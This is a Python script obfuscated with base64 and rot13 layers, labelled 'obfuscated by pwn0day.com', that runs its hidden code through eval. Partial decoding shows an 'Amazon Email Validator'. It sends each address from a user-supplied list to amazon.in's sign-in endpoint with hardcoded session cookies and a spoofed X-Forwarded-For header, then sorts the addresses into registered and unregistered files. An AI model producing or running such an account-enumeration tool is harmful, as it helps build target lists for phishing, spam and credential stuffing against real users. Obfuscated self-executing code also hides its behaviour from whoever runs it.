# Python code obfuscated by pwn0day.com
 

import base64, codecs
magic = 'aW1wb3J0IHRocmVhZGluZwppbXBvcnQgcXVldWUKaW1wb3J0IHN5cwppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHRpbWUKaW1wb3J0IG9zCmltcG9ydCB1cmxsaWIzCmltcG9ydCBzaWduYWwKCmRlZiBrZXlib2FyZEludGVycnVwdEhhbmRsZXIoc2lnbmFsLCBmcmFtZSk6CiAgICBleGl0KDApCgoKc2lnbmFsLnNpZ25hbChzaWduYWwuU0lHSU5ULCBrZXlib2FyZEludGVycnVwdEhhbmRsZXIpCgp1cmxsaWIzLmRpc2FibGVfd2FybmluZ3ModXJsbGliMy5leGNlcHRpb25zLkluc2VjdXJlUmVxdWVzdFdhcm5pbmcpCgpvcy5lbnZpcm9uWyJUWiJdID0gIkFzaWEvSmFrYXJ0YSIKdGltZS50enNldCgpCmxvY2sgPSB0aHJlYWRpbmcuTG9jaygpCgp0aXRsZSA9ICJbK10gQW1hem9uIEVtYWlsIFZhbGlkYXRvciBbK10iCmxpdmUgPSAiYXBfY2hhbmdlX2xvZ2luX2NsYWltIgpkZWFkID0gIlRoZXJlIHdhcyBhIHByb2JsZW0iCgpwcmludCgiXG4iICsgdGl0bGUgKyAiXG4iKQoKZmlsZW5hbWUgPSBpbnB1dCgiLSBTZWxlY3QgWW91ciBMaXN0IDogIikKaWYgbm90IG9zLnBhdGguaXNmaWxlKGZpbGVuYW1lKToKICAgIGV4aXQoImZpbGUgbm90IGV4aXN0cyIpCmRpciA9IGlucHV0KCItIFNhdmUgVG8gOiAiKQppZiBub3Qgb3MucGF0aC5leGlzdHMoZGlyKToKICAgIG9zLm1ha2VkaXJzKGRpcikKd29ya2VycyA9IGlucHV0KCItIFRocmVhZCA6ICIpCmlmIG5vdCB3b3JrZXJzLmlzZGlnaXQoKSBvciB3b3JrZXJzID09ICIwIjoKICAgIGV4aXQoIm11c3QgYmUgYSBudW1iZXIgYW5kIGNhbm5vdCBiZSB6ZXJvIikKbW9kZSA9IGlucHV0KCItIDEuTm9ybWFsIE9yIDIuRmFzdCA6ICIpCmlmIG5vdCBtb2RlLmlzZGlnaXQoKSBvciBpbnQobW9kZSkgPiAyOgogICAgZXhpdCgibXVzdCBiZSBhIG51bWJlciBhbmQgY2Fubm90ID4gMiIpCmlmIG1vZGUgPT0gIjEiOgogICAgZGVsYXkgPSBpbnB1dCgiLSBEZWxheSA6ICIpCiAgICBpZiBkZWxheSA9PSAiMSI6CiAgICAgICAgZXhpdCgibXVzdCBiZSBhIG51bWJlciIpCmVsc2U6CiAgICBkZWxheSA9ICIwIgoKbm8gPSAwCmxpdmVfYyA9IDAKZGVhZF9jID0gMAp1bmtub3duX2MgPSAwCgplbWFpbF90b3RhbCA9IGxlbihvcGVuKGZpbGVuYW1lLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpLnJlYWRsaW5lcygpKQpwcmludCgiXG4iLCBlbmQ9IiIpICAjIHByaW50IG9uZSBsaW5lCgpkZWYgYXBwZW5kX3RvX2ZpbGUoZmlsZW5hbWUsIGRhdGEpOgogICAgZmlsZSA9IG9wZW4oZmlsZW5hbWUsICJhKyIsKQogICAgZmlsZS53cml0ZShkYXRhICsgIlxuIikKICAgIGZpbGUuY2xvc2UoKQoKCmRlZiBkb19yZXF1ZXN0cygpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBnbG9iYWwgbGl2ZSwgZGVhZCwgbm8sIHRpdGxlLCBmaWxlbmFtZSwgbGl2ZV9jLCBkZWFkX2MsIHVua25vd25fYywgd29ya2VycwogICAgICAgIGVtYWlsID0gcS5nZXQoKQogICAgICAgIHVybCA9ICJodHRwczovL3d3dy5hbWF6b24uaW4vYXAvc2lnbmluIgogICAgICAgIHBheWxvYWQgPSAoCiAgICAgICAgICAgICJhcHBBY3Rpb25Ub2tlbj1wb2lDNnFiaVRUazMwRURUc1JObjJ5Vms5Z0FqM0QmYXBwQWN0aW9uPVNJR05JTl9QV0RfQ09MTEVDVCZzdWJQYWdlVHlwZT1TaWduSW5DbGFpbUNvbGxlY3Qmb3BlbmlkLnJldHVybl90bz1hcGUlM0FhSFIwY0hNNkx5OTNkM2N1WVc'
love = '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'
god = 'R1Wmh2dWZqNDN4UFNVNFN0bFBqUWcwbi80dXc1WHQzNFNEMk1pRk4ybDN4bzFmOHRtYmJuTnhzd3VHMnNTTTJXTWozcm1CVEY2K0VDM3dScHl6WFhRQUVFNzlscEthL2w4ZTBpVDBRYm5hZmxpNE9ZU05LSzBSY2EwdHJERC9RbTRvcnlrUzdNbFkzR3ZKTmpmV2RHcUJtSER0Rmk4Nzl0eWZOWVdHZHRCNmNySGZ6YTM1YlVpQmZ3ZnlobzRqZ3AxRnp0TlpRR3BEZnFNdFlRRjMzZWhDUGl4WEpIV3U0K0I3bXBjU0RVcWNpRTJuRmZSeUc3MzNLZzBVbkVZV3NLT1BhN3V1UHJZcFJmNE9LNTVocE1qbEozcXpmSEk2c2puSlZTYU5Na0pPb2RYdGxqZTBtVGhnOXdwTytqbXliTjB3VkhSbitJa3R6dVV6amo5WVhkUUpuRnRUVW9JaGRtSnlydWxtRUkvMk9PY3o1N0hGR0dqeFYyYXdDSHlWd2lIaXBjVWUzZGRaaTNqb1RpVmNFUlFLdm90NFZlS3pGLzZ1bFplNmZkazNzVGN5THpSRndoWW1MYXJKUFI3aFFPWmRzZWk2dUJCUEFiL0Y4bzZkUnc3WS83VUN3WlJaUnloUElnNGkzYjBEMDFqclFhbGtUTFo4WG90SDAwY0Y2Rm84cmtwc1FJbGFmZTRXV0pOR0pvWWtMaDQiCiAgICAgICAgKQogICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICJYLUZvcndhcmRlZC1Gb3IiOiAiMTI3LjAuMC4xIiwKICAgICAgICAgICAgIm9yaWdpbiI6ICJodHRwczovL3d3dy5hbWF6b24uaW4iLAogICAgICAgICAgICAiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsCiAgICAgICAgICAgICJ1c2VyLWFnZW50IjogIk1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84MC4wLjM5ODcuMTQ5IFNhZmFyaS81MzcuMzYiLAogICAgICAgICAgICAicmVmZXJlciI6ICJodHRwczovL3d3dy5hbWF6b24uaW4vYXAvc2lnbmluP19lbmNvZGluZz1VVEY4Jmlnbm9yZUF1dGhTdGF0ZT0xJm9wZW5pZC5hc3NvY19oYW5kbGU9aW5mbGV4Jm9wZW5pZC5jbGFpbWVkX2lkPWh0dHAlM0ElMkYlMkZzcGVjcy5vcGVuaWQubmV0JTJGYXV0aCUyRjIuMCUyRmlkZW50aWZpZXJfc2VsZWN0Jm9wZW5pZC5pZGVudGl0eT1odHRwJTNBJTJGJTJGc3BlY3Mub3BlbmlkLm5ldCUyRmF1dGglMkYyLjAlMkZpZGVudGlmaWVyX3NlbGVjdCZvcGVuaWQubW9kZT1jaGVja2lkX3NldHVwJm9wZW5pZC5ucz1odHRwJTNBJTJGJTJGc3BlY3Mub3BlbmlkLm5ldCUyRmF1dGglMkYyLjAmb3BlbmlkLm5zLnBhcGU9aHR0cCUzQSUyRiUyRnNwZWNzLm9wZW5pZC5uZXQlMkZleHRlbnNpb25zJTJGcGFwZSUyRjEuMCZvcGVuaWQucGFwZS5tYXhfYXV0aF9hZ2U9MCZvcGVuaWQucmV0dXJuX3RvPWh0dHBzJTNBJTJGJTJGd3d3LmFtYXpvbi5pbiUyRiUzRnJlZl8lM0RuYXZfY3VzdHJlY19zaWduaW4mc3dpdGNoX2FjY291bnQ9IiwKICAgICAgICAgICAgImNvb2tpZSI6ICdzZXNzaW9uLWlkPTI2Mi05ODY4OTc2LTI2OTM4NjE7IGkxOG4tcHJlZnM9SU5SOyB1YmlkLWFjYmluPTI2Mi02Mzg5OTA4LTk1OTEyMzc7IHgtd2wtdWlkPTFBRG1kUWFGMndwMS9MQ2VENzBpa2R4MGNWZFA3MGt3dDdUTndZcGk1QmxtNng4TWorRnkvZHpITHV2SlMwMmhlNWh5MlRQUWN2WXc9OyBzZXNzaW9uLXRva2VuPSJyU0VmZXZISlpFWnNnUmwyWDhGZ3JxL2tHU0hHdGxQUmc4TWM0Q0o5V2ZtOFIxNHZhZm43RVBqa'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))